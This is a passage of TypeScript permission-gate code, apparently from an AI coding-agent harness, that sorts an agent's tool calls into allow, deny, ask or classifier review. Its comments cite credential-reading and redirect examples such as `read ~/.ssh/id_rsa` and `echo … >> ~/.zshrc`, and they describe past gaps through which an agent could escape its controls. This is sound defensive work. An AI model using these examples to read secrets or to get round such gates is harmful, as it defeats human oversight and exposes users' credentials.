			return askRule ? askOrDeny(askRule) : { decision: "allow", cause: "plan-readonly" };
		}
		return { decision: "deny", cause: "plan-mode" };
	}

	// Claude Code's blockReadsOutsideWorkingDirectories refuses a read tool's
	// outside path before any ask or allow rule can prompt for it or allow it
	// (bypass mode returned above).
	const readsPath = tier === "safe" || READS_A_PATH.has(tool);
	if (params.blockReadsOutsideWorkingDirectories && readsPath && subject && !workingSpaceHolds(subject, params.resolvedSubject ?? subject, true, true)) {
		return { decision: "deny", cause: "blocked-outside-read" };
	}

	// An explicit ask rule is the user's stated intent to be prompted, so it wins
	// over auto mode too: the classifier never gets to auto-approve a match.
	const askRule = ask.find((r) => ruleMatches(r, toolName, subject, cwd));
	if (askRule) return askOrDeny(askRule);

	/**
	 * The session's own auto-memory and scratchpad directories are
	 * harness-designated working space, like plan mode's plan file: the system
	 * prompt instructs the model to write memories and temp files there, so
	 * gating those writes (outside-cwd, and for memory under the protected
	 * `.claude` dir) makes the harness block its own feature — auto mode's
	 * classifier was correctly flagging them as out-of-project writes. This
	 * clears *only* the exact per-session dirs passed in; any other path under
	 * `.claude` or `/tmp` gets no special treatment. The resolved form is
	 * where the write actually lands, so it is the one judged — a symlink
	 * planted inside a session dir must not turn this into an allow for
	 * wherever it points.
	 */
	if (isWritingTool(normalizeToolName(toolName)) && subject) {
		const target = params.resolvedSubject ?? subject;
		for (const { dir, cause } of [
			{ dir: params.memoryDirPath, cause: "memory-dir" as const },
			{ dir: params.scratchpadDirPath, cause: "scratchpad-dir" as const },
		]) {
			if (dir && isInsideDir(target, dir, cwd)) return { decision: "allow", cause };
		}
		// The plan file lives under the state dir (`~/.onecode/plans`), which the
		// runtime protects; clear it here, before the protected check, since it is
		// harness working space the model is told to write (review L2).
		if (params.planFilePath && isPlanFilePath(target, params.planFilePath, cwd)) return { decision: "allow", cause: "plan-file" };
	}

	// Protected-path writes are checked *before* allow rules, so an
	// `Edit(.claude/**)` entry cannot pre-approve reconfiguring the agent's own
	// permissions or planting a git hook. In auto mode they go to the classifier.
	if (isWritingTool(tool) && subject && isProtected(subject, params.resolvedSubject)) {
		if (mode === "dontAsk") return { decision: "deny", cause: "protected-path" };
		if (mode === "auto") return { decision: "classify", cause: "protected-path" };
		return { decision: "ask", cause: "protected-path" };
	}

	const outsideWorkingDir = (): Decision => {
		if (mode === "auto") return { decision: "classify", cause: "working-dir" };
		if (mode === "dontAsk") return { decision: "deny", cause: "working-dir" };
		return { decision: "ask", cause: "working-dir" };
	};

	// A custom tool's read outside the working space is never pre-approved by an
	// allow rule: a bare `Artifact` rule is for publishing the project's pages.
	if (READS_A_PATH.has(tool) && subject && !workingSpaceHolds(subject, params.resolvedSubject ?? subject, true, true)) return outsideWorkingDir();

	const usableAllow =
		mode === "auto"
			? allow.filter((rule) => {
					if (isBroadExecutionRule(rule)) return false;
					if (params.classifyAllShell && isShellTool(rule.tool)) return false;
					return true;
				})
			: allow;
	// Command allow rules (bash, monitor) must cover EVERY subcommand of a
	// compound line (CC semantics); a deny/ask rule above fired on ANY subcommand.
	const allowRule =
		subjectKind(tool) === "command"
			? subject
				? findBashAllowRule(usableAllow, subject, tool, { readOnly: readOnlyShell, readsNoFile: readsNoFileShell })
				: undefined
			: usableAllow.find((r) => ruleMatches(r, toolName, subject, cwd));
	if (allowRule) {
		// Claude Code's path constraints, checked before any allow rule: a rule
		// for the command never covers a redirect outside the working space
		// (`Bash(echo:*)` and `echo … >> ~/.zshrc`), or onto a protected path.
		if (subjectKind(tool) === "command" && subject && normalizeToolName(tool) !== "powershell" && redirectEscapes(subject)) return outsideWorkingDir();
		return { decision: "allow", rule: allowRule, cause: "rule" };
	}

	/**
	 * The shell tools' own read-only check, in every mode, as Claude Code's Bash
	 * and PowerShell tools approve a provably read-only command themselves before
	 * any mode logic runs (findings §36, "Where Claude Code's pre-gate sits"). The
	 * proof is the auto-mode pre-gate's, so its plugs for Claude Code's gaps
	 * (symlink-following options, glob operands) hold here too. A safe verdict
	 * that writes (an in-project redirect) is not read-only: it takes the mode's
	 * path, where auto mode's pre-gate may still clear it. A read-only command
	 * that reads outside the working space is judged like the read tools' outside
	 * read. Plan mode has its own branch above.
	 *
	 * A model that gets Claude Code's fast paths also gets acceptEdits' shell
	 * half, in acceptEdits mode and in auto mode (which skips the classifier for
	 * anything acceptEdits would allow): a line made only of Claude Code's
	 * acceptEdits file commands on the working space (`containedNonNetwork`), or
	 * a safe line whose redirects land there. Workspace directories count as
	 * working space for its writes. Cheap and tiny models keep the stricter path.
	 */
	const fastPaths = params.claudeCodeFastPaths === true;
	if (subject && tool === "bash") {
		const evidence = shellEvidence(subject, fastPaths ? params.workspaceDirs : undefined);
		if (isReadOnly(evidence)) return { decision: "allow", cause: "read-only" };
		if (evidence.readOnlyOutside && evidence.writes.length === 0) return outsideWorkingDir();
		if (fastPaths && (mode === "acceptEdits" || mode === "auto") && (evidence.verdict === "safe" || evidence.containedNonNetwork)) {
			return { decision: "allow", cause: "mode" };
		}
	}
	if (subject && tool === "powershell" && params.powershellParse) {
		if (powershellReadOnly({ parse: params.powershellParse, cwd, home: homedir(), readableRoots: sessionReadableRoots() }).readOnly) {
			return { decision: "allow", cause: "read-only" };
		}
		// Claude Code's acceptEdits PowerShell cmdlets on the working space, the
		// PowerShell half of the bash file-command fast path above.
		if (
			fastPaths &&
			(mode === "acceptEdits" || mode === "auto") &&
			powershellTreeContainedEdits(params.powershellParse, { cwd, home: homedir(), writableRoots: params.workspaceDirs, protectedDirs: params.protectedDirs }).ok
		) {
			return { decision: "allow", cause: "mode" };
		}
	}

	if (mode === "auto" && (DELEGATION_TOOLS.has(tool) || CLASSIFY_IN_AUTO_TOOLS.has(tool))) {
		return { decision: "classify", cause: "mode" };
	}

	/**
	 * Working-directory containment — Claude Code's `pathInAllowedWorkingPath`
	 * (filesystem.ts): the read tier is allowed inside the working directory and
	 * asks outside it, and acceptEdits approves edits inside it only. The
	 * harness's own session dirs (auto-memory, scratchpad, persisted tool
	 * results, the plan file) count as inside — the system prompt tells the
	 * model to read and write there. The resolved subject is judged where the
	 * caller resolved one, so a symlink inside the project that points out of
	 * it is outside. Until 2026-09-05 neither check existed: `read ~/.ssh/id_rsa`
	 * was allowed in every mode including auto and plan, and acceptEdits wrote
	 * anywhere on disk (PERMISSIONS-REVIEW-2026-09-05 H1, H2).
	 */
	const inWorkingSpace = (reads = false): boolean => workingSpaceHolds(subject, params.resolvedSubject ?? subject, true, reads);
	if (tier === "safe") {
		// No path argument (grep/find/ls default to the cwd) is an in-project read.
		if (!subject || inWorkingSpace(true)) return { decision: "allow", cause: "tier" };
		// Claude Code's auto mode reads outside the working directories without
		// the classifier (the read tools are on its safe allowlist); the caller
		// raises its one-time first-read prompt. A credential path is still
		// judged: our plug, as in the shell pre-gate. So is a content search of
		// anything but one file: pi's grep runs ripgrep with `--hidden`, and a
		// directory's credentials sit anywhere below it (`grep` on `~` reads
		// `~/.ssh`), where no check of the named path can see them.
		const target = toAbsolute(cwd, params.resolvedSubject ?? subject, homedir());
		const searchesTree = tool === "grep" && !isRegularFile(target);
		if (mode === "auto" && fastPaths && !searchesTree && !isCredential(target) && !isCredential(toAbsolute(cwd, subject, homedir()))) {
			return { decision: "allow", cause: "outside-read" };
		}
		return outsideWorkingDir();
	}
	if (isAutoAllowedTool(toolName, tool)) return { decision: "allow", cause: "tier" };
	// Auto mode skips the classifier for an edit acceptEdits would allow, on a
	// model that gets Claude Code's fast paths: anywhere in the working space,
	// workspace directories and execution-primitive files included. Outside it
	// the edit is still classified.
	if (tier === "edit" && (mode === "acceptEdits" || (mode === "auto" && fastPaths))) {
		if (subject && inWorkingSpace()) return { decision: "allow", cause: "mode" };
		return outsideWorkingDir();
	}

	// Everything left over goes to the classifier in auto mode, and to the user
	// in every other mode.
	if (mode === "auto") return { decision: "classify", cause: "mode" };

	return askOrDeny();
}
